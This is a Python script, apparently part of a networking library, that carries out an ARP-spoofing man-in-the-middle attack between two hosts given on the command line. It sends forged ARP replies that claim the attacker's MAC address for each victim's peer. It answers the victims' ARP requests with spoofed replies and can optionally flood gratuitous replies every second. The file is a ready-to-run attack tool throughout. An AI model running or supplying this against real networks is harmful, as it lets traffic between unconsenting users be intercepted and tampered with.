"""Man In The Middle with ARP Spoofing.

Usage:

	python3 -m agave.arp.mitm <alice> <bob> [-f]

"""
if __name__ == "__main__":

	import sys
	from agave.core.arp import ARP, OPERATION_REQUEST
	from agave.core.ethernet import ETHER_TYPE_ARP, MACAddress
	from agave.nic.interfaces import NetworkInterface
	from .utils import create_filter, _create_socket
	from .resolve import resolve_mac
	from .spoof import Spoofer
	from ipaddress import IPv4Address


	try:
		# Parses arguments
		alice = IPv4Address(sys.argv[1])
		bob = IPv4Address(sys.argv[2])
		interface = NetworkInterface.get_by_host(alice)
		if len(sys.argv) > 3 and sys.argv[3] == "-f":
			print("[INFO] Flood gratuitous is enabled.")
			gratuitous = True
		else:
			gratuitous = False
		# Initialize var
		sock = _create_socket()
		messages = []
		# Build filters 
		filter_alice = create_filter(OPERATION_REQUEST, sender=alice, target=bob)
		filter_bob = create_filter(OPERATION_REQUEST, sender=bob, target=alice)
		if gratuitous:
			# Resolving addresses
			alice_mac = resolve_mac(alice, interface, sock, raise_on_miss=True)
			bob_mac = resolve_mac(bob, interface, sock, raise_on_miss=True)
			# Build messages
			message_for_alice = ARP.is_at(
				interface.mac.address, bob,
				alice_mac.address, alice
			)
			message_for_bob = ARP.is_at(
				interface.mac.address, alice,
				bob_mac.address, bob
			)
			addr = (interface.name, ETHER_TYPE_ARP)
			messages = [(message_for_bob, addr), (message_for_alice, addr)]
		# Build job
		job = Spoofer(
			sock,
			interface.mac,
			lambda x: filter_alice(x) or filter_bob(x),
			messages,
			interval=(1 if gratuitous else 3600),
			wait=0
		)
		# Running
		print("[INFO] Running...")
		job.run()

	except KeyboardInterrupt:
		pass
	except BaseException as e:
		raise e
		print(f"[ERROR] {e}")

